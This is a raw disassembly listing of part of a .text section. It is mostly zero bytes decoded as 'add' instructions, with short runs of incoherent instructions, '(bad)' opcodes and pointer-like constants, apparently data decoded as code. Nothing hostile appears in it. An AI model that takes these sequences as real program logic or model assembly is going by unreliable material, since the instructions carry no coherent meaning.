                           .text:0040197d 00 00                            add    %al,(%eax)
                           .text:0040197f 00 00                            add    %al,(%eax)
                           .text:00401981 00 00                            add    %al,(%eax)
                           .text:00401983 00 00                            add    %al,(%eax)
                           .text:00401985 00 00                            add    %al,(%eax)
                           .text:00401987 00 00                            add    %al,(%eax)
                           .text:00401989 00 00                            add    %al,(%eax)
                           .text:0040198b 00 00                            add    %al,(%eax)
                           .text:0040198d 00 00                            add    %al,(%eax)
                           .text:0040198f 00 e6                            add    %ah,%dh
                           .text:00401991 a5                               movsl  %ds:(%esi),%es:(%edi)
                           .text:00401992 dd 69 d2                         (bad)  -0x2e(%ecx)
                           .text:00401995 a3 8a 8a e0 97                   mov    %eax,0x97e08a8a
                           .text:0040199a 40                               inc    %eax
                           .text:0040199b ba bf 7f 00 00                   mov    $0x7fbf,%edx
                           .text:004019a0 70 2e                            jo     0x004019d0
                           .text:004019a2 d2 b8 bf 7f 00 00                sarb   %cl,0x7fbf(%eax)
                           .text:004019a8 e7 32                            out    %eax,$0x32
                           .text:004019aa 3a 79 02                         cmp    0x2(%ecx),%bh
                           .text:004019ad 5c                               pop    %esp
                           .text:004019ae 9f                               lahf   
                           .text:004019af 8a 70 98                         mov    -0x68(%eax),%dh
                           .text:004019b2 40                               inc    %eax
                           .text:004019b3 ba bf 7f 00 00                   mov    $0x7fbf,%edx
                           .text:004019b8 08 55 6d                         or     %dl,0x6d(%ebp)
                           .text:004019bb c5 bf 7f 00 00 68                lds    0x6800007f(%edi),%edi
                           .text:004019c1 19 74 74 a6                      sbb    %esi,-0x5a(%esp,%esi,2)
                           .text:004019c5 1b 75 71                         sbb    0x71(%ebp),%esi
                           .text:004019c8 70 9b                            jo     0x00401965
                           .text:004019ca 40                               inc    %eax
                           .text:004019cb ba bf 7f 00 00                   mov    $0x7fbf,%edx
                           .text:004019d0 48                               dec    %eax
                           .text:004019d1 61                               popa   
                           .text:004019d2 17                               pop    %ss
                           .text:004019d3 04 00                            add    $0x0,%al
                           .text:004019d5 00 00                            add    %al,(%eax)
                           .text:004019d7 00 00                            add    %al,(%eax)
                           .text:004019d9 00 00                            add    %al,(%eax)
                           .text:004019db 00 00                            add    %al,(%eax)
                           .text:004019dd 00 00                            add    %al,(%eax)
                           .text:004019df 00 00                            add    %al,(%eax)
                           .text:004019e1 00 00                            add    %al,(%eax)
                           .text:004019e3 00 00                            add    %al,(%eax)
                           .text:004019e5 00 00                            add    %al,(%eax)
                           .text:004019e7 00 00                            add    %al,(%eax)
                           .text:004019e9 00 00                            add    %al,(%eax)
                           .text:004019eb 00 00                            add    %al,(%eax)
                           .text:004019ed 00 00                            add    %al,(%eax)
                           .text:004019ef 00 00                            add    %al,(%eax)
                           .text:004019f1 00 00                            add    %al,(%eax)
                           .text:004019f3 00 00                            add    %al,(%eax)
                           .text:004019f5 00 00                            add    %al,(%eax)
                           .text:004019f7 00 00                            add    %al,(%eax)
                           .text:004019f9 00 00                            add    %al,(%eax)
                           .text:004019fb 00 00                            add    %al,(%eax)
                           .text:004019fd 00 00                            add    %al,(%eax)
                           .text:004019ff 00 00                            add    %al,(%eax)
                           .text:00401a01 00 00                            add    %al,(%eax)
                           .text:00401a03 00 00                            add    %al,(%eax)
                           .text:00401a05 00 00                            add    %al,(%eax)
                           .text:00401a07 00 00                            add    %al,(%eax)
                           .text:00401a09 00 00                            add    %al,(%eax)
                           .text:00401a0b 00 00                            add    %al,(%eax)
                           .text:00401a0d 00 00                            add    %al,(%eax)
                           .text:00401a0f 00 00                            add    %al,(%eax)
                           .text:00401a11 00 00                            add    %al,(%eax)
                           .text:00401a13 00 00                            add    %al,(%eax)
                           .text:00401a15 00 00                            add    %al,(%eax)
                           .text:00401a17 00 00                            add    %al,(%eax)
                           .text:00401a19 00 00                            add    %al,(%eax)
                           .text:00401a1b 00 00                            add    %al,(%eax)
                           .text:00401a1d 00 00                            add    %al,(%eax)
                           .text:00401a1f 00 00                            add    %al,(%eax)
                           .text:00401a21 00 00                            add    %al,(%eax)
                           .text:00401a23 00 00                            add    %al,(%eax)
                           .text:00401a25 00 00                            add    %al,(%eax)
                           .text:00401a27 00 00                            add    %al,(%eax)
                           .text:00401a29 00 00                            add    %al,(%eax)
                           .text:00401a2b 00 00                            add    %al,(%eax)
                           .text:00401a2d 00 00                            add    %al,(%eax)
                           .text:00401a2f 00 00                            add    %al,(%eax)
                           .text:00401a31 00 00                            add    %al,(%eax)
                           .text:00401a33 00 00                            add    %al,(%eax)
                           .text:00401a35 00 00                            add    %al,(%eax)
                           .text:00401a37 00 00                            add    %al,(%eax)
                           .text:00401a39 00 00                            add    %al,(%eax)
                           .text:00401a3b 00 00                            add    %al,(%eax)
                           .text:00401a3d 00 00                            add    %al,(%eax)
                           .text:00401a3f 00 00                            add    %al,(%eax)
                           .text:00401a41 00 00                            add    %al,(%eax)
                           .text:00401a43 00 00                            add    %al,(%eax)
                           .text:00401a45 00 00                            add    %al,(%eax)
                           .text:00401a47 00 00                            add    %al,(%eax)
                           .text:00401a49 00 00                            add    %al,(%eax)
                           .text:00401a4b 00 00                            add    %al,(%eax)
                           .text:00401a4d 00 00                            add    %al,(%eax)
                           .text:00401a4f 00 00                            add    %al,(%eax)
                           .text:00401a51 00 00                            add    %al,(%eax)
                           .text:00401a53 00 00                            add    %al,(%eax)
                           .text:00401a55 00 00                            add    %al,(%eax)
                           .text:00401a57 00 00                            add    %al,(%eax)
                           .text:00401a59 00 00                            add    %al,(%eax)
                           .text:00401a5b 00 00                            add    %al,(%eax)
                           .text:00401a5d 00 00                            add    %al,(%eax)
                           .text:00401a5f 00 00                            add    %al,(%eax)
                           .text:00401a61 00 00                            add    %al,(%eax)
                           .text:00401a63 00 00                            add    %al,(%eax)
                           .text:00401a65 00 00                            add    %al,(%eax)
                           .text:00401a67 00 00                            add    %al,(%eax)
                           .text:00401a69 00 00                            add    %al,(%eax)
                           .text:00401a6b 00 00                            add    %al,(%eax)
                           .text:00401a6d 00 00                            add    %al,(%eax)
                           .text:00401a6f 00 00                            add    %al,(%eax)
                           .text:00401a71 00 00                            add    %al,(%eax)
                           .text:00401a73 00 00                            add    %al,(%eax)
                           .text:00401a75 00 00                            add    %al,(%eax)
                           .text:00401a77 00 00                            add    %al,(%eax)
                           .text:00401a79 00 00                            add    %al,(%eax)
                           .text:00401a7b 00 00                            add    %al,(%eax)
                           .text:00401a7d 00 00                            add    %al,(%eax)
                           .text:00401a7f 00 00                            add    %al,(%eax)
                           .text:00401a81 00 00                            add    %al,(%eax)
                           .text:00401a83 00 00                            add    %al,(%eax)
                           .text:00401a85 00 00                            add    %al,(%eax)
                           .text:00401a87 00 00                            add    %al,(%eax)
                           .text:00401a89 00 00                            add    %al,(%eax)
                           .text:00401a8b 00 00                            add    %al,(%eax)
                           .text:00401a8d 00 00                            add    %al,(%eax)
                           .text:00401a8f 00 00                            add    %al,(%eax)
                           .text:00401a91 00 00                            add    %al,(%eax)
                           .text:00401a93 00 00                            add    %al,(%eax)
                           .text:00401a95 00 00                            add    %al,(%eax)
                           .text:00401a97 00 00                            add    %al,(%eax)
                           .text:00401a99 00 00                            add    %al,(%eax)
                           .text:00401a9b 00 00                            add    %al,(%eax)
                           .text:00401a9d 00 00                            add    %al,(%eax)
                           .text:00401a9f 00 00                            add    %al,(%eax)
                           .text:00401aa1 00 00                            add    %al,(%eax)
                           .text:00401aa3 00 00                            add    %al,(%eax)
                           .text:00401aa5 00 00                            add    %al,(%eax)
                           .text:00401aa7 00 00                            add    %al,(%eax)
                           .text:00401aa9 00 00                            add    %al,(%eax)
                           .text:00401aab 00 00                            add    %al,(%eax)
                           .text:00401aad 00 00                            add    %al,(%eax)
                           .text:00401aaf 00 00                            add    %al,(%eax)
                           .text:00401ab1 00 00                            add    %al,(%eax)
                           .text:00401ab3 00 00                            add    %al,(%eax)
                           .text:00401ab5 00 00                            add    %al,(%eax)
                           .text:00401ab7 00 00                            add    %al,(%eax)
                           .text:00401ab9 00 00                            add    %al,(%eax)
                           .text:00401abb 00 00                            add    %al,(%eax)
                           .text:00401abd 00 00                            add    %al,(%eax)
                           .text:00401abf 00 00                            add    %al,(%eax)
                           .text:00401ac1 00 00                            add    %al,(%eax)
                           .text:00401ac3 00 00                            add    %al,(%eax)
                           .text:00401ac5 00 00                            add    %al,(%eax)
                           .text:00401ac7 00 f3                            add    %dh,%bl
                           .text:00401ac9 e9 92 d0 38 b1                   jmp    0xb178eb60
                           .text:00401ace fb                               sti    
                           .text:00401acf 44                               inc    %esp
                           .text:00401ad0 60                               pusha  
                           .text:00401ad1 96                               xchg   %eax,%esi
                           .text:00401ad2 40                               inc    %eax
                           .text:00401ad3 ba bf 7f 00 00                   mov    $0x7fbf,%edx
                           .text:00401ad8 b0 58                            mov    $0x58,%al
                           .text:00401ada 70 00                            jo     0x00401adc
                           .text:00401adc 00 00                            add    %al,(%eax)
                           .text:00401ade 00 00                            add    %al,(%eax)
                           .text:00401ae0 f4                               hlt    
                           .text:00401ae1 2c 85                            sub    $0x85,%al
                           .text:00401ae3 bc 6d 52 ad 0b                   mov    $0xbad526d,%esp
                           .text:00401ae8 90                               nop
                           .text:00401ae9 99                               cltd   
                           .text:00401aea 40                               inc    %eax
                           .text:00401aeb ba bf 7f 00 00                   mov    $0x7fbf,%edx
                           .text:00401af0 f8                               clc    
                           .text:00401af1 3a 87 af bf 7f 00                cmp    0x7fbfaf(%edi),%al
                           .text:00401af7 00 00                            add    %al,(%eax)
                           .text:00401af9 00 00                            add    %al,(%eax)
                           .text:00401afb 00 00                            add    %al,(%eax)
                           .text:00401afd 00 00                            add    %al,(%eax)
                           .text:00401aff 00 00                            add    %al,(%eax)
                           .text:00401b01 00 00                            add    %al,(%eax)
                           .text:00401b03 00 00                            add    %al,(%eax)
                           .text:00401b05 00 00                            add    %al,(%eax)
                           .text:00401b07 00 00                            add    %al,(%eax)
                           .text:00401b09 00 00                            add    %al,(%eax)
                           .text:00401b0b 00 00                            add    %al,(%eax)
                           .text:00401b0d 00 00                            add    %al,(%eax)
                           .text:00401b0f 00 00                            add    %al,(%eax)
                           .text:00401b11 00 00                            add    %al,(%eax)
                           .text:00401b13 00 00                            add    %al,(%eax)
                           .text:00401b15 00 00                            add    %al,(%eax)
                           .text:00401b17 00 00                            add    %al,(%eax)
                           .text:00401b19 00 00                            add    %al,(%eax)
                           .text:00401b1b 00 00                            add    %al,(%eax)
                           .text:00401b1d 00 00                            add    %al,(%eax)
                           .text:00401b1f 00 00                            add    %al,(%eax)
                           .text:00401b21 00 00                            add    %al,(%eax)
                           .text:00401b23 00 00                            add    %al,(%eax)
                           .text:00401b25 00 00                            add    %al,(%eax)
                           .text:00401b27 00 00                            add    %al,(%eax)
                           .text:00401b29 00 00                            add    %al,(%eax)
                           .text:00401b2b 00 00                            add    %al,(%eax)
                           .text:00401b2d 00 00                            add    %al,(%eax)
                           .text:00401b2f 00 00                            add    %al,(%eax)
                           .text:00401b31 00 00                            add    %al,(%eax)
                           .text:00401b33 00 00                            add    %al,(%eax)
                           .text:00401b35 00 00                            add    %al,(%eax)
                           .text:00401b37 00 00                            add    %al,(%eax)
                           .text:00401b39 00 00                            add    %al,(%eax)
                           .text:00401b3b 00 00                            add    %al,(%eax)
                           .text:00401b3d 00 00                            add    %al,(%eax)
                           .text:00401b3f 00 00                            add    %al,(%eax)
                           .text:00401b41 00 00                            add    %al,(%eax)
                           .text:00401b43 00 00                            add    %al,(%eax)
                           .text:00401b45 00 00                            add    %al,(%eax)
                           .text:00401b47 00 00                            add    %al,(%eax)
                           .text:00401b49 00 00                            add    %al,(%eax)
                           .text:00401b4b 00 00                            add    %al,(%eax)
                           .text:00401b4d 00 00                            add    %al,(%eax)
                           .text:00401b4f 00 00                            add    %al,(%eax)
                           .text:00401b51 00 00                            add    %al,(%eax)
                           .text:00401b53 00 00                            add    %al,(%eax)
                           .text:00401b55 00 00                            add    %al,(%eax)
                           .text:00401b57 00 f9                            add    %bh,%cl
                           .text:00401b59 15 c7 b7 d9 5a                   adc    $0x5ad9b7c7,%eax
                           .text:00401b5e 91                               xchg   %eax,%ecx
                           .text:00401b5f 4b                               dec    %ebx
                           .text:00401b60 d0 95 40 ba bf 7f                rclb   0x7fbfba40(%ebp)
                           .text:00401b66 00 00                            add    %al,(%eax)
                           .text:00401b68 60                               pusha  
                           .text:00401b69 58                               pop    %eax
                           .text:00401b6a 70 00                            jo     0x00401b6c
                           .text:00401b6c 00 00                            add    %al,(%eax)
                           .text:00401b6e 00 00                            add    %al,(%eax)
                           .text:00401b70 00 00                            add    %al,(%eax)
                           .text:00401b72 00 00                            add    %al,(%eax)
                           .text:00401b74 00 00                            add    %al,(%eax)
                           .text:00401b76 00 00                            add    %al,(%eax)
                           .text:00401b78 00 00                            add    %al,(%eax)
                           .text:00401b7a 00 00                            add    %al,(%eax)
                           .text:00401b7c 00 00                            add    %al,(%eax)
                           .text:00401b7e 00 00                            add    %al,(%eax)
                           .text:00401b80 00 00                            add    %al,(%eax)
                           .text:00401b82 00 00                            add    %al,(%eax)
                           .text:00401b84 00 00                            add    %al,(%eax)
                           .text:00401b86 00 00                            add    %al,(%eax)
                           .text:00401b88 00 00                            add    %al,(%eax)
                           .text:00401b8a 00 00                            add    %al,(%eax)
                           .text:00401b8c 00 00                            add    %al,(%eax)
                           .text:00401b8e 00 00                            add    %al,(%eax)
                           .text:00401b90 00 00                            add    %al,(%eax)
                           .text:00401b92 00 00                            add    %al,(%eax)
                           .text:00401b94 00 00                            add    %al,(%eax)
                           .text:00401b96 00 00                            add    %al,(%eax)
                           .text:00401b98 00 00                            add    %al,(%eax)
                           .text:00401b9a 00 00                            add    %al,(%eax)
                           .text:00401b9c 00 00                            add    %al,(%eax)
                           .text:00401b9e 00 00                            add    %al,(%eax)
                           .text:00401ba0 00 00                            add    %al,(%eax)
                           .text:00401ba2 00 00                            add    %al,(%eax)
                           .text:00401ba4 00 00                            add    %al,(%eax)
                           .text:00401ba6 00 00                            add    %al,(%eax)
                           .text:00401ba8 00 00                            add    %al,(%eax)
                           .text:00401baa 00 00                            add    %al,(%eax)
                           .text:00401bac 00 00                            add    %al,(%eax)
                           .text:00401bae 00 00                            add    %al,(%eax)
                           .text:00401bb0 00 00                            add    %al,(%eax)
                           .text:00401bb2 00 00                            add    %al,(%eax)
                           .text:00401bb4 00 00                            add    %al,(%eax)
                           .text:00401bb6 00 00                            add    %al,(%eax)
                           .text:00401bb8 00 00                            add    %al,(%eax)
                           .text:00401bba 00 00                            add    %al,(%eax)
                           .text:00401bbc 00 00                            add    %al,(%eax)
                           .text:00401bbe 00 00                            add    %al,(%eax)
                           .text:00401bc0 00 00                            add    %al,(%eax)
                           .text:00401bc2 00 00                            add    %al,(%eax)
                           .text:00401bc4 00 00                            add    %al,(%eax)
                           .text:00401bc6 00 00                            add    %al,(%eax)
                           .text:00401bc8 00 00                            add    %al,(%eax)
                           .text:00401bca 00 00                            add    %al,(%eax)
                           .text:00401bcc 00 00                            add    %al,(%eax)
                           .text:00401bce 00 00                            add    %al,(%eax)
                           .text:00401bd0 00 00                            add    %al,(%eax)
                           .text:00401bd2 00 00                            add    %al,(%eax)
                           .text:00401bd4 00 00                            add    %al,(%eax)
                           .text:00401bd6 00 00                            add    %al,(%eax)
                           .text:00401bd8 00 00                            add    %al,(%eax)
                           .text:00401bda 00 00                            add    %al,(%eax)
                           .text:00401bdc 00 00                            add    %al,(%eax)
                           .text:00401bde 00 00                            add    %al,(%eax)
                           .text:00401be0 00 00                            add    %al,(%eax)
                           .text:00401be2 00 00                            add    %al,(%eax)
                           .text:00401be4 00 00                            add    %al,(%eax)
                           .text:00401be6 00 00                            add    %al,(%eax)
                           .text:00401be8 7f 3f                            jg     0x00401c29
                           .text:00401bea 50                               push   %eax
                           .text:00401beb 36 57                            ss push %edi
                           .text:00401bed a6                               cmpsb  %es:(%edi),%ds:(%esi)
                           .text:00401bee b0 07                            mov    $0x7,%al
                           .text:00401bf0 20 91 40 ba bf 7f                and    %dl,0x7fbfba40(%ecx)
                           .text:00401bf6 00 00                            add    %al,(%eax)
                           .text:00401bf8 28 fa                            sub    %bh,%dl
                           .text:00401bfa 94                               xchg   %eax,%esp
                           .text:00401bfb a4                               movsb  %ds:(%esi),%es:(%edi)
                           .text:00401bfc bf 7f 00 00 00                   mov    $0x7f,%edi
                           .text:00401c01 00 00                            add    %al,(%eax)
                           .text:00401c03 00 00                            add    %al,(%eax)
                           .text:00401c05 00 00                            add    %al,(%eax)
                           .text:00401c07 00 01                            add    %al,(%ecx)
                           .text:00401c09 04 00                            add    $0x0,%al
                           .text:00401c0b 00 00                            add    %al,(%eax)
                           .text:00401c0d 00 00                            add    %al,(%eax)
                           .text:00401c0f 00 e0                            add    %ah,%al
                           .text:00401c11 d5 6f                            aad    $0x6f
                           .text:00401c13 05 00 00 00 00                   add    $0x0,%eax
                           .text:00401c18 50                               push   %eax
                           .text:00401c19 4d                               dec    %ebp
                           .text:00401c1a c8 03 00 00                      enter  $0x3,$0x0
                           .text:00401c1e 00 00                            add    %al,(%eax)
                           .text:00401c20 00 00                            add    %al,(%eax)
                           .text:00401c22 00 00                            add    %al,(%eax)
                           .text:00401c24 00 00                            add    %al,(%eax)
                           .text:00401c26 00 00                            add    %al,(%eax)
                           .text:00401c28 00 00                            add    %al,(%eax)
                           .text:00401c2a 00 00                            add    %al,(%eax)
                           .text:00401c2c 00 00                            add    %al,(%eax)
                           .text:00401c2e 00 00                            add    %al,(%eax)
                           .text:00401c30 50                               push   %eax
                           .text:00401c31 bd 48 ba bf 7f                   mov    $0x7fbfba48,%ebp
                           .text:00401c36 00 00                            add    %al,(%eax)
                           .text:00401c38 60                               pusha  
                           .text:00401c39 61                               popa   
                           .text:00401c3a 17                               pop    %ss
                           .text:00401c3b 04 00                            add    $0x0,%al
                           .text:00401c3d 00 00                            add    %al,(%eax)
                           .text:00401c3f 00 00                            add    %al,(%eax)
                           .text:00401c41 00 00                            add    %al,(%eax)
                           .text:00401c43 00 00                            add    %al,(%eax)
                           .text:00401c45 00 00                            add    %al,(%eax)
                           .text:00401c47 00 00                            add    %al,(%eax)
                           .text:00401c49 00 00                            add    %al,(%eax)
                           .text:00401c4b 00 00                            add    %al,(%eax)
                           .text:00401c4d 00 00                            add    %al,(%eax)
                           .text:00401c4f 00 00                            add    %al,(%eax)
                           .text:00401c51 00 00                            add    %al,(%eax)
                           .text:00401c53 00 00                            add    %al,(%eax)
                           .text:00401c55 00 00                            add    %al,(%eax)
                           .text:00401c57 00 00                            add    %al,(%eax)
                           .text:00401c59 00 00                            add    %al,(%eax)
                           .text:00401c5b 00 00                            add    %al,(%eax)
                           .text:00401c5d 00 00                            add    %al,(%eax)
                           .text:00401c5f 00 00                            add    %al,(%eax)
                           .text:00401c61 00 00                            add    %al,(%eax)
                           .text:00401c63 00 00                            add    %al,(%eax)
                           .text:00401c65 00 00                            add    %al,(%eax)
                           .text:00401c67 00 00                            add    %al,(%eax)
                           .text:00401c69 00 00                            add    %al,(%eax)
                           .text:00401c6b 00 00                            add    %al,(%eax)
                           .text:00401c6d 00 00                            add    %al,(%eax)
                           .text:00401c6f 00 24 17                         add    %ah,(%edi,%edx,1)
                           .text:00401c72 f6 60 38                         mulb   0x38(%eax)
                           .text:00401c75 9e                               sahf   
                           .text:00401c76 75 e6                            jne    0x00401c5e
                           .text:00401c78 d0 be 48 ba bf 7f                sarb   0x7fbfba48(%esi)
                           .text:00401c7e 00 00                            add    %al,(%eax)
                           .text:00401c80 f0 3c 49                         lock cmp $0x49,%al
                           .text:00401c83 ba bf 7f 00 00                   mov    $0x7fbf,%edx
                           .text:00401c88 00 00                            add    %al,(%eax)
                           .text:00401c8a 00 00                            add    %al,(%eax)
                           .text:00401c8c 00 00                            add    %al,(%eax)
                           .text:00401c8e 00 00                            add    %al,(%eax)
                           .text:00401c90 00 00                            add    %al,(%eax)
                           .text:00401c92 00 00                            add    %al,(%eax)
                           .text:00401c94 00 00                            add    %al,(%eax)
                           .text:00401c96 00 00                            add    %al,(%eax)
                           .text:00401c98 00 00                            add    %al,(%eax)
                           .text:00401c9a 00 00                            add    %al,(%eax)
                           .text:00401c9c 00 00                            add    %al,(%eax)
                           .text:00401c9e 00 00                            add    %al,(%eax)
                           .text:00401ca0 00 00                            add    %al,(%eax)
                           .text:00401ca2 00 00                            add    %al,(%eax)
                           .text:00401ca4 00 00                            add    %al,(%eax)
                           .text:00401ca6 00 00                            add    %al,(%eax)
                           .text:00401ca8 00 00                            add    %al,(%eax)
                           .text:00401caa 00 00                            add    %al,(%eax)
                           .text:00401cac 00 00                            add    %al,(%eax)
                           .text:00401cae 00 00                            add    %al,(%eax)
                           .text:00401cb0 00 00                            add    %al,(%eax)
                           .text:00401cb2 00 00                            add    %al,(%eax)
                           .text:00401cb4 00 00                            add    %al,(%eax)
                           .text:00401cb6 00 00                            add    %al,(%eax)
                           .text:00401cb8 07                               pop    %es
                           .text:00401cb9 21 90 ff 32 7a 0a                and    %edx,0xa7a32ff(%eax)
                           .text:00401cbf 8f                               (bad)  
                           .text:00401cc0 b0 b7                            mov    $0xb7,%al
                           .text:00401cc2 48                               dec    %eax
                           .text:00401cc3 ba bf 7f 00 00                   mov    $0x7fbf,%edx
                           .text:00401cc8 d0 5f bc                         rcrb   -0x44(%edi)
                           .text:00401ccb b6 bf                            mov    $0xbf,%dh
                           .text:00401ccd 7f 00                            jg     0x00401ccf
                           .text:00401ccf 00 68 19                         add    %ch,0x19(%eax)
                           .text:00401cd2 74 74                            je     0x00401d48
                           .text:00401cd4 a6                               cmpsb  %es:(%edi),%ds:(%esi)
                           .text:00401cd5 1b 75 71                         sbb    0x71(%ebp),%esi
                           .text:00401cd8 70 9b                            jo     0x00401c75
                           .text:00401cda 40                               inc    %eax
                           .text:00401cdb ba bf 7f 00 00                   mov    $0x7fbf,%edx
                           .text:00401ce0 30 61 17                         xor    %ah,0x17(%ecx)
                           .text:00401ce3 04 00                            add    $0x0,%al
                           .text:00401ce5 00 00                            add    %al,(%eax)
                           .text:00401ce7 00 00                            add    %al,(%eax)
                           .text:00401ce9 00 00                            add    %al,(%eax)
                           .text:00401ceb 00 00                            add    %al,(%eax)
                           .text:00401ced 00 00                            add    %al,(%eax)
                           .text:00401cef 00 00                            add    %al,(%eax)
                           .text:00401cf1 00 00                            add    %al,(%eax)
                           .text:00401cf3 00 00                            add    %al,(%eax)
                           .text:00401cf5 00 00                            add    %al,(%eax)
                           .text:00401cf7 00 00                            add    %al,(%eax)
                           .text:00401cf9 00 00                            add    %al,(%eax)
                           .text:00401cfb 00 00                            add    %al,(%eax)
                           .text:00401cfd 00 00                            add    %al,(%eax)
                           .text:00401cff 00 00                            add    %al,(%eax)
                           .text:00401d01 00 00                            add    %al,(%eax)
                           .text:00401d03 00 00                            add    %al,(%eax)
                           .text:00401d05 00 00                            add    %al,(%eax)
                           .text:00401d07 00 00                            add    %al,(%eax)
                           .text:00401d09 00 00                            add    %al,(%eax)
                           .text:00401d0b 00 00                            add    %al,(%eax)
                           .text:00401d0d 00 00                            add    %al,(%eax)
                           .text:00401d0f 00 00                            add    %al,(%eax)
                           .text:00401d11 00 00                            add    %al,(%eax)
                           .text:00401d13 00 00                            add    %al,(%eax)
                           .text:00401d15 00 00                            add    %al,(%eax)
                           .text:00401d17 00 00                            add    %al,(%eax)
                           .text:00401d19 00 00                            add    %al,(%eax)
                           .text:00401d1b 00 00                            add    %al,(%eax)
                           .text:00401d1d 00 00                            add    %al,(%eax)
                           .text:00401d1f 00 00                            add    %al,(%eax)
                           .text:00401d21 00 00                            add    %al,(%eax)
                           .text:00401d23 00 00                            add    %al,(%eax)
                           .text:00401d25 00 00                            add    %al,(%eax)
                           .text:00401d27 00 00                            add    %al,(%eax)
                           .text:00401d29 00 00                            add    %al,(%eax)
                           .text:00401d2b 00 00                            add    %al,(%eax)
                           .text:00401d2d 00 00                            add    %al,(%eax)
                           .text:00401d2f 00 0c 28                         add    %cl,(%eax,%ebp,1)
                           .text:00401d32 9e                               sahf   
                           .text:00401d33 e5 a4                            in     $0xa4,%eax
                           .text:00401d35 b6 fc                            mov    $0xfc,%dh
                           .text:00401d37 35 c0 5f 4c a5                   xor    $0xa54c5fc0,%eax
                           .text:00401d3c bf 7f 00 00 30                   mov    $0x3000007f,%edi
                           .text:00401d41 3d 49 ba bf 7f                   cmp    $0x7fbfba49,%eax
                           .text:00401d46 00 00                            add    %al,(%eax)
                           .text:00401d48 00 00                            add    %al,(%eax)
                           .text:00401d4a 00 00                            add    %al,(%eax)
                           .text:00401d4c 00 00                            add    %al,(%eax)
                           .text:00401d4e 00 00                            add    %al,(%eax)
                           .text:00401d50 00 00                            add    %al,(%eax)
                           .text:00401d52 00 00                            add    %al,(%eax)
                           .text:00401d54 00 00                            add    %al,(%eax)
                           .text:00401d56 00 00                            add    %al,(%eax)
                           .text:00401d58 00 00                            add    %al,(%eax)
                           .text:00401d5a 00 00                            add    %al,(%eax)
                           .text:00401d5c 00 00                            add    %al,(%eax)
                           .text:00401d5e 00 00                            add    %al,(%eax)
                           .text:00401d60 ce                               into   
                           .text:00401d61 11 c6                            adc    %eax,%esi
                           .text:00401d63 f6 d0                            not    %al
                           .text:00401d65 28 d7                            sub    %dl,%bh
                           .text:00401d67 25 d0 5b 4c a5                   and    $0xa54c5bd0,%eax
                           .text:00401d6c bf 7f 00 00 60                   mov    $0x6000007f,%edi
                           .text:00401d71 58                               pop    %eax
                           .text:00401d72 70 00                            jo     0x00401d74
                           .text:00401d74 00 00                            add    %al,(%eax)
                           .text:00401d76 00 00                            add    %al,(%eax)
                           .text:00401d78 00 00                            add    %al,(%eax)
                           .text:00401d7a 00 00                            add    %al,(%eax)
                           .text:00401d7c 00 00                            add    %al,(%eax)
                           .text:00401d7e 00 00                            add    %al,(%eax)
                           .text:00401d80 00 00                            add    %al,(%eax)
                           .text:00401d82 00 00                            add    %al,(%eax)
                           .text:00401d84 00 00                            add    %al,(%eax)
                           .text:00401d86 00 00                            add    %al,(%eax)
                           .text:00401d88 00 00                            add    %al,(%eax)
                           .text:00401d8a 00 00                            add    %al,(%eax)
                           .text:00401d8c 00 00                            add    %al,(%eax)
                           .text:00401d8e 00 00                            add    %al,(%eax)
                           .text:00401d90 f0 85 d8                         lock test %ebx,%eax
                           .text:00401d93 e0 1d                            loopne 0x00401db2
                           .text:00401d95 65 80 00 e0                      addb   $0xe0,%gs:(%eax)
                           .text:00401d99 5a                               pop    %edx
                           .text:00401d9a 4c                               dec    %esp
                           .text:00401d9b a5                               movsl  %ds:(%esi),%es:(%edi)
                           .text:00401d9c bf 7f 00 00 50                   mov    $0x5000007f,%edi
                           .text:00401da1 3d 49 ba bf 7f                   cmp    $0x7fbfba49,%eax
                           .text:00401da6 00 00                            add    %al,(%eax)
                           .text:00401da8 00 00                            add    %al,(%eax)
                           .text:00401daa 00 00                            add    %al,(%eax)
                           .text:00401dac 00 00                            add    %al,(%eax)
                           .text:00401dae 00 00                            add    %al,(%eax)
                           .text:00401db0 00 00                            add    %al,(%eax)
                           .text:00401db2 00 00                            add    %al,(%eax)
                           .text:00401db4 00 00                            add    %al,(%eax)
                           .text:00401db6 00 00                            add    %al,(%eax)
                           .text:00401db8 00 00                            add    %al,(%eax)
                           .text:00401dba 00 00                            add    %al,(%eax)
                           .text:00401dbc 00 00                            add    %al,(%eax)
                           .text:00401dbe 00 00                            add    %al,(%eax)
                           .text:00401dc0 00 00                            add    %al,(%eax)
                           .text:00401dc2 00 00                            add    %al,(%eax)
                           .text:00401dc4 00 00                            add    %al,(%eax)
                           .text:00401dc6 00 00                            add    %al,(%eax)
                           .text:00401dc8 00 00                            add    %al,(%eax)
                           .text:00401dca 00 00                            add    %al,(%eax)
                           .text:00401dcc 00 00                            add    %al,(%eax)
                           .text:00401dce 00 00                            add    %al,(%eax)
                           .text:00401dd0 00 00                            add    %al,(%eax)
                           .text:00401dd2 00 00                            add    %al,(%eax)
                           .text:00401dd4 00 00                            add    %al,(%eax)
                           .text:00401dd6 00 00                            add    %al,(%eax)
                           .text:00401dd8 93                               xchg   %eax,%ebx
                           .text:00401dd9 f9                               stc    
                           .text:00401dda 57                               push   %edi
                           .text:00401ddb 14 63                            adc    $0x63,%al
                           .text:00401ddd df 3f                            fistpll (%edi)
                           .text:00401ddf eb 18                            jmp    0x00401df9
                           .text:00401de1 7e 63                            jle    0x00401e46
                           .text:00401de3 b9 bf 7f 00 00                   mov    $0x7fbf,%ecx
                           .text:00401de8 b0 58                            mov    $0x58,%al
                           .text:00401dea 70 00                            jo     0x00401dec
                           .text:00401dec 00 00                            add    %al,(%eax)
                           .text:00401dee 00 00                            add    %al,(%eax)
                           .text:00401df0 00 00                            add    %al,(%eax)
                           .text:00401df2 00 00                            add    %al,(%eax)
                           .text:00401df4 00 00                            add    %al,(%eax)
                           .text:00401df6 00 00                            add    %al,(%eax)
                           .text:00401df8 00 00                            add    %al,(%eax)
                           .text:00401dfa 00 00                            add    %al,(%eax)
                           .text:00401dfc 00 00                            add    %al,(%eax)
                           .text:00401dfe 00 00                            add    %al,(%eax)
                           .text:00401e00 00 00                            add    %al,(%eax)
                           .text:00401e02 00 00                            add    %al,(%eax)
                           .text:00401e04 00 00                            add    %al,(%eax)
                           .text:00401e06 00 00                            add    %al,(%eax)
                           .text:00401e08 ae                               scas   %es:(%edi),%al
                           .text:00401e09 0b 37                            or     (%edi),%esi
                           .text:00401e0b 0c 59                            or     $0x59,%al
                           .text:00401e0d f3 03 fd                         repz add %ebp,%edi
                           .text:00401e10 60                               pusha  
                           .text:00401e11 86 19                            xchg   %bl,(%ecx)
                           .text:00401e13 b6 bf                            mov    $0xbf,%dh
